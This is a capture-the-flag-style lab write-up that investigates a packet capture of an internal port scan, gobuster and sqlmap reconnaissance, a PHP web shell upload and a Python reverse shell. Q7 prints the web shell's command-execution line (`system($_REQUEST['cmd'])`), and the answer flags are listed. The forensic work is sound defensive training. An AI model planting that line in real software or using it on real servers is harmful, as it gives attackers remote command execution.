# Blue Team Labs Online Lab: Network Analysis – Web Shell Writeup

**Category:** Network Forensics | **Difficulty:** Easy
**Tactic:** Initial Access / Reconnaissance
**Tools:** Wireshark, TCPDump, TShark

**Scenario:** 
The SOC received an alert in their SIEM for 'Local to Local Port Scanning' where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

---

### Q1: What is the IP responsible for conducting the port scan activity?
*   **Approach:** Analyze network traffic volume and packet structures in Wireshark to locate unusual connection patterns originating from a single internal host.
*   **Steps Taken:**
    *   Navigated to **Statistics -> Conversations** in Wireshark and observed a high volume of traffic flowing between `10.251.96.4` and `10.251.96.5`.
    *   Applied the filter `ip.addr==10.251.96.4`.
    *   Identified that the IP `10.251.96.4` is conducting a TCP SYN Scan. The host sends a barrage of `SYN` packets to various ports on the target. Closed ports respond with `RST, ACK`, while open port 80 responds with `SYN, ACK` (frames 133 and 134).
*   **Evidence:**
    ![Q1 - Conversations](images/q1_1.png)
    ![Q1 - SYN Packets Filter](images/q1_2.png)
*   **Flag:** `10.251.96.4`

### Q2: What is the port range scanned by the suspicious host?
*   **Approach:** Use Wireshark conversation sorting to determine the upper and lower bounds of the destination ports targeted during the reconnaissance phase.
*   **Steps Taken:**
    *   Navigated to **Statistics -> Conversations** under the **TCP** tab for the suspicious host `10.251.96.4`.
    *   Identified that the port range scanned systematically covers ports starting from port 1 up to port 1024.
*   **Evidence:**
    ![Q2 - TCP Conversations Port Range](images/q2.png)
*   **Flag:** `1-1024`

### Q3: What is the type of port scan conducted?
*   **Approach:** Examine the TCP flag patterns observed in the packet capture during the scanning phase.
*   **Steps Taken:** Correlated the outbound `SYN` packets and inbound responses, confirming a standard TCP SYN Scan.
*   **Flag:** `TCP SYN`

### Q4: Two more tools were used to perform reconnaissance against open ports, what were they?
*   **Approach:** Filter for HTTP application-layer traffic to inspect User-Agent strings and URI request patterns following the discovery of open port 80.
*   **Steps Taken:**
    *   Applied the filter `ip.addr==10.251.96.4 and http`.
    *   Discovered requests containing the `User-Agent: gobuster/3.0.1`, indicating directory enumeration.
    *   Identified subsequent requests containing `User-Agent: sqlmap/1.4.7#stable (http://sqlmap.org)`, revealing automated SQL injection testing.
*   **Evidence:**
    ![Q4 - Gobuster User Agent](images/q4_1.png)
    ![Q4 - Sqlmap User Agent](images/q4_2.png)
*   **Flag:** `gobuster 3.0.1, sqlmap 1.4.7`

### Q5: What is the name of the php file through which the attacker uploaded a web shell?
*   **Approach:** Isolate HTTP POST requests to track file upload actions targeting web application endpoints.
*   **Steps Taken:**
    *   Applied the filter `ip.addr==10.251.96.4 and http.request.method==POST`.
    *   Inspected the HTTP stream to review the `Referer` header and the uploaded filename `dbfunctions.php`.
*   **Evidence:**
    ![Q5 - HTTP POST Upload Request and Referer](images/q5.png)
*   **Flag:** `editprofile.php`

### Q6: What is the name of the web shell that the attacker uploaded?
*   **Approach:** Inspect the parameters and file names passed within the multipart form-data payload of the upload request.
*   **Steps Taken:** Located the filename inside the file upload stream identified in Question 5.
*   **Flag:** `dbfunctions.php`

### Q7: What is the parameter used in the web shell for executing commands?
*   **Approach:** Read the source code contents of the uploaded web shell script as captured in cleartext within the network stream.
*   **Steps Taken:** Analyzed the PHP snippet `system($_REQUEST['cmd']);` inside the uploaded file to identify the user-supplied input parameter.
*   **Evidence:**
    ![Q7 - Web Shell Source Code Inspection](images/q7.png)
*   **Flag:** `cmd`

### Q8: What is the first command executed by the attacker?
*   **Approach:** Filter HTTP requests occurring chronologically after the web shell upload packet index to monitor remote code execution attempts.
*   **Steps Taken:**
    *   Identified the web shell upload packet at index `16102`.
    *   Applied the filter `ip.addr==10.251.96.4 and frame.number > 16102 and http`.
    *   Found the initial system execution query `cmd=id` at packet number 16134.
*   **Evidence:**
    ![Q8 - Upload Packet and Filtered Stream](images/q8_1.png)
    ![Q8 - Initial Executed Command Stream](images/q8_2.png)
*   **Flag:** `id`

### Q9: What is the type of shell connection the attacker obtains through command execution?
*   **Approach:** Analyze the payload strings executed via the web shell parameter to determine the nature of the network session established.
*   **Steps Taken:**
    *   Observed a Python-based socket connection payload sent through the `cmd` parameter following initial reconnaissance commands.
    *   Recognized that the target host initiates an outbound connection back to the attacker's listener host rather than opening a listening port locally, characterizing it as a reverse shell.
*   **Evidence:**
    ![Q9 - Filtered Payload List](images/q9_1.png)
    ![Q9 - Python Reverse Shell Payload](images/q9_2.png)
*   **Flag:** `reverse shell`

### Q10: What is the port he uses for the shell connection?
*   **Approach:** Parse the IP address and port arguments embedded directly inside the connection script payload.
*   **Steps Taken:** Extracted the destination port argument (`4422`) specified inside the Python socket connection function parameters pointing back to the attacker's listener host (`10.251.96.4`).
*   **Evidence:**
    ![Q10 - Reverse Shell Port Parameter](images/q10.png)
*   **Flag:** `4422`
